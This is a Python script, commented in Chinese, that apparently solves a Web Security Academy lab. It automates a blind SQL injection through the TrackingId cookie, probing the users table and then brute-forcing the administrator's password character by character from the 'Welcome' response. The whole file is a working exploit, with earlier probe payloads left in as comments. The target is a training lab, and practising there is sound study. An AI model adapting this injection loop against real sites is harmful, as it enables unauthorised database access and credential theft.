import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


## 原始的SQL語法
# SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

def go_blind(character,number):
    cookies = {
        #查詢username 是不是a開頭
        #'TrackingId': f'66Sem7LoFoLRTPwv\' AND (SELECT \'a\' FROM users LIMIT 1)=\'a',
        #查詢username是不是administrator
        #'TrackingId': f'66Sem7LoFoLRTPwv\' AND (SELECT \'a\' FROM users where username=\'administrator\')=\'a',
        #查詢password長度是不是20
        #'TrackingId': f'66Sem7LoFoLRTPwv\' AND (SELECT \'a\' FROM users where username=\'administrator\' AND LENGTH(password)=20)=\'a',
        
        'TrackingId': f'66Sem7LoFoLRTPwv\' AND (SELECT SUBSTRING(password,{number},1) FROM Users WHERE Username = \'administrator\') =\'{character}',
        'session': 'DxbCJew3AQ47ibUZuV98ocsdnbQM3fUy',
    }
    headers = {
        '$Host': '0aa70064042545b78058dfd7004200d1.web-security-academy.net',
        '$Cache-Control': 'max-age=0',
        '$Sec-Ch-Ua': '\\"Not.A/Brand\\";v=\\"8\\", \\"Chromium\\";v=\\"114\\", \\"Google Chrome\\";v=\\"114\\"',
        '$Sec-Ch-Ua-Mobile': '?0',
        '$Sec-Ch-Ua-Platform': '\\"macOS\\"',
        '$Upgrade-Insecure-Requests': '1',
        '$User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        '$Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        '$Sec-Fetch-Site': 'same-origin',
        '$Sec-Fetch-Mode': 'navigate',
        '$Sec-Fetch-User': '?1',
        '$Sec-Fetch-Dest': 'document',
        '$Referer': 'https://0aa70064042545b78058dfd7004200d1.web-security-academy.net/',
        '$Accept-Encoding': 'gzip, deflate',
        '$Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    params = (
        ('category', 'Gifts'),
    )
    response = requests.get('https://0a0b00db0497459681826bc4006f0064.web-security-academy.net/filter', headers=headers, params=params, cookies=cookies, verify=False)
    return response.text
if __name__ == "__main__":
    for number in range(20,21):
        for character in "abcdefghijklmnopqrstuvwxyz0123456789":
            response = go_blind(character,number)
            if 'Welcome' in response:
                print(number,character)
                continue
            else:
                pass            
    #go_blind('')